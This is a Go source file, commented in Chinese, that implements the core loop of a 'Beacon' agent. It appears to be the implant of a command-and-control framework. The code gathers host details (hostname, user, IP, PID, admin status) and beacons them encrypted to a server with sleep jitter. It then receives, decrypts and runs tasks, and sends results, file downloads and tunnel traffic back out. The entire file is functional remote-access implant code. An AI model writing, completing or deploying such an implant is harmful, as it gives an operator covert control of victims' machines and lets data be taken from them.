// Package core 实现 Beacon 的主循环和生命周期管理。
package core

import (
	"beacon/pkg/command"
	"beacon/pkg/profile"
	"beacon/pkg/utils/crypt"
	transport "beacon/pkg/utils/http"
	"beacon/pkg/utils/packet"
	"fmt"
	"sync/atomic"
	"time"
)

// Agent 是 Beacon 的核心运行实体，持有上下文、传输层客户端和命令处理器。
// 主循环以心跳驱动：发送心跳 → 接收任务 → 执行 → 回传结果。
type Agent struct {
	Ctx     *Context
	client  *transport.HttpClient
	handler *command.Handler
	stop    atomic.Bool
}

// NewAgent 创建并初始化一个 Agent 实例。
// 内部会加载配置、收集系统信息、生成随机 BeaconID 和会话密钥。
func NewAgent() (*Agent, error) {
	ctx, err := NewContext()
	if err != nil {
		return nil, err
	}

	handler := command.NewHandler(ctx.Meta.ACP)
	handler.SetID(ctx.BeaconID, ctx.SessionKey)

	agent := &Agent{
		Ctx:     ctx,
		client:  transport.NewHttpClient(),
		handler: handler,
	}
	handler.SetResultSink(func(pkt []byte) {
		agent.Ctx.Outbox.Enqueue(pkt)
	})
	return agent, nil
}

// Close 释放 Agent 持有的所有资源（命令处理器、上下文、会话密钥）。
func (a *Agent) Close() {
	if a == nil {
		return
	}
	if a.handler != nil {
		a.handler.Close()
	}
	if a.Ctx != nil {
		a.Ctx.Close()
	}
}

// Stop 请求 Agent 主循环在当前心跳周期结束后退出。
func (a *Agent) Stop() {
	if a != nil {
		a.stop.Store(true)
	}
}

// Run 启动 Beacon 主循环，返回退出码（0=正常退出，-1=初始化失败）。
// 主循环流程：sleep → 构建心跳 → 加密 → 发送 → 分派任务 → 回传结果。
func (a *Agent) Run() int {
	if a == nil || a.Ctx == nil {
		return -1
	}

	fmt.Println("[*] Beacon modular Go starting...")
	fmt.Printf("[*] Metadata: OS=%s Arch=%s User=%s IP=%s\n",
		a.Ctx.Meta.OS, a.Ctx.Meta.Arch, a.Ctx.Meta.Username, a.Ctx.Meta.InternalIP)
	fmt.Printf("[*] BeaconID: %d\n", a.Ctx.BeaconID)

	for a.Ctx.Active() && !a.stop.Load() {
		// 1. 按配置的 sleep + jitter 等待
		a.sleep()

		// 2. 构建心跳明文并加密
		plain, err := a.buildHeartbeatPlain()
		if err != nil {
			fmt.Printf("[!] Pack heartbeat error: %v\n", err)
			continue
		}

		heartbeat, err := crypt.EncryptHeartbeat(profile.GlobalProfile.HTTP.EncryptKey, plain)
		if err != nil {
			fmt.Printf("[!] Encryption error: %v\n", err)
			continue
		}

		// 3. 发送心跳，获取服务端返回的加密任务
		response, err := a.client.SendData(heartbeat, nil)
		if err != nil {
			fmt.Printf("[!] Communication error: %v\n", err)
			continue
		}

		// 4. 解密并执行任务，结果写入 Outbox
		a.dispatchTasks(response)

		// 5. 将传输和隧道的挂起数据包入队
		a.flushTransfers()
		a.flushTunnels()

		// 6. 逐个加密并发送 Outbox 中的结果
		a.flushOutbox(heartbeat)
	}

	return 0
}

// sleep 按配置的 SleepTime 和 Jitter 百分比执行带抖动的等待。
func (a *Agent) sleep() {
	sleepFor := profile.GlobalProfile.SleepTime
	if sleepFor <= 0 {
		return
	}

	jitter := profile.GlobalProfile.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}
	if jitter > 0 {
		r := int(randomU32() % uint32(jitter+1))
		sleepFor += time.Duration((int64(r) * int64(sleepFor)) / 100)
	}

	fmt.Printf("[*] Sleeping for %v...\n", sleepFor)
	time.Sleep(sleepFor)
}

// buildHeartbeatPlain 组装心跳明文：BeaconID + SessionKey + 系统元数据。
func (a *Agent) buildHeartbeatPlain() ([]byte, error) {
	meta := a.Ctx.Meta
	metaBytes, err := packet.PackArray([]any{
		meta.OS,
		meta.Arch,
		meta.Hostname,
		meta.Username,
		meta.InternalIP,
		meta.ProcessName,
		uint32(meta.PID),
		meta.IsAdmin,
		uint32(meta.ACP),
		uint32(profile.GlobalProfile.SleepTime / time.Second),
		uint32(profile.GlobalProfile.Jitter),
	})
	if err != nil {
		return nil, err
	}
	return packet.PackHeartbeat(a.Ctx.BeaconID, a.Ctx.SessionKey, metaBytes)
}

// dispatchTasks 解密服务端返回的任务包，逐条解析并分派给对应的命令处理器。
// 每条任务格式：[taskID int32][commandID int32][payload bytes]。
func (a *Agent) dispatchTasks(encryptedTasks []byte) {
	if len(encryptedTasks) == 0 || string(encryptedTasks) == "404 page not found" {
		return
	}

	// 用会话密钥解密任务
	plain, err := crypt.DecryptTask(a.Ctx.SessionKey, encryptedTasks)
	if err != nil {
		fmt.Printf("[*] No tasks or decrypt error: %v\n", err)
		return
	}

	// 外层循环：每个元素是一条完整的任务块
	outer := packet.CreateParser(plain)
	for outer.Size() > 0 {
		taskBlock := outer.ParseBytes()
		if outer.HasError() {
			fmt.Printf("[!] Parse task block error: %v\n", outer.Error())
			break
		}

		taskParser := packet.CreateParser(taskBlock)
		taskID := taskParser.ParseInt32()
		commandID := taskParser.ParseInt32()
		payload := taskParser.ParseBytes()
		if taskParser.HasError() {
			a.enqueueFinal(taskID, commandID, []byte(taskParser.Error().Error()))
			continue
		}

		fmt.Printf("[*] Received Task ID: %d, Command ID: %d\n", taskID, commandID)
		results, err := a.handler.Handle(taskID, commandID, payload)
		if err != nil {
			a.enqueueFinal(taskID, commandID, []byte(fmt.Sprintf("error: %v", err)))
			continue
		}

		for _, result := range results {
			if isFinalResult(commandID) {
				a.Ctx.Outbox.Enqueue(result)
			} else {
				a.enqueueFinal(taskID, commandID, result)
			}
		}

		if commandID == command.CommandExit {
			a.Ctx.Stop()
		}
	}
}

// enqueueFinal 将结果包装为最终响应包并入队 Outbox。
func (a *Agent) enqueueFinal(taskID uint32, commandID uint32, payload []byte) {
	a.Ctx.Outbox.Enqueue(packet.MakeFinalPacket(taskID, commandID, payload))
}

// isFinalResult 判断该命令的结果是否已经是最终包（如 Download 的分块数据），
// 若是则直接入队，不再用 MakeFinalPacket 包装。
func isFinalResult(commandID uint32) bool {
	return commandID == command.CommandDownload
}

// flushTransfers 将文件传输的挂起数据包移入 Outbox。
func (a *Agent) flushTransfers() {
	for _, pkt := range a.handler.GetPendingDownloadPackets() {
		a.Ctx.Outbox.Enqueue(pkt)
	}
}

// flushTunnels 将隧道转发的挂起数据包移入 Outbox。
func (a *Agent) flushTunnels() {
	for _, pkt := range a.handler.GetPendingTunnelPackets() {
		a.Ctx.Outbox.Enqueue(pkt)
	}
}

// flushOutbox 逐个取出 Outbox 中的结果包，加密后发送给服务端。
// 发送失败时将未发送的包重新压回队列头部，等待下次心跳重试。
func (a *Agent) flushOutbox(heartbeat []byte) {
	for cur := a.Ctx.Outbox.Drain(); cur != nil; {
		next := cur.next
		cur.next = nil

		encrypted, err := crypt.EncryptResult(a.Ctx.SessionKey, cur.packet)
		if err != nil {
			cur.next = next
			a.Ctx.Outbox.PushFrontList(cur)
			return
		}

		if _, err := a.client.SendData(heartbeat, encrypted); err != nil {
			cur.next = next
			a.Ctx.Outbox.PushFrontList(cur)
			return
		}

		cur = next
	}
}
